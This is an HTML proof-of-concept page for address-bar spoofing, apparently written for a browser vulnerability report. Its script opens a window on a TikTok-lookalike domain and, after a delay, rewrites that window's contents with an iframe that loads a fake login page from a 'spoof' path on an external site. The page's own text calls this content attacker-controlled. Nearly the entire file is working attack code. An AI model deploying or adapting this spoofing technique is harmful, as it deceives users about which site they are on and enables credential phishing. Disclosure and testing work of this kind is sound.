<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Address Bar Spoofing PoC</title>

<style>
body {
    font-family: Arial, sans-serif;
    text-align: center;
    margin-top: 60px;
}

.note {
    color: red;
    font-size: 14px;
    margin-bottom: 15px;
}

/* Rectangle iframe (16:9 ratio) */
.iframe-container {
    width: 80%;
    max-width: 900px;
    margin: 0 auto;
}

iframe {
    width: 100%;
    height: 500px;   /* persegi panjang */
    border: 1px solid #ccc;
    border-radius: 8px;
}
button {
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
}
</style>

<script>
function go() {
    var win = window.open('https://ads.tikok.com:9090');

    if (!win) {
        alert("Please tap again.");
        return;
    }

    setTimeout(function () {
        try {
            win.document.open();
            win.document.write(`
                <div style="text-align:center; font-family:Arial;">
                    <p class="note">
                        Demo: Address bar shows tiktok.com,
                        but content below is attacker-controlled.
                    </p>

                    <div class="iframe-container">
                        <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
                    </div>
                </div>
            `);
            win.document.close();
        } catch (e) {
            console.log("Blocked by browser:", e);
        }
    }, 3000);
}
</script>
</head>

<body>

<h2>Address Bar Spoofing Test</h2>
<button onclick="go()">Start Test</button>

</body>
</html>
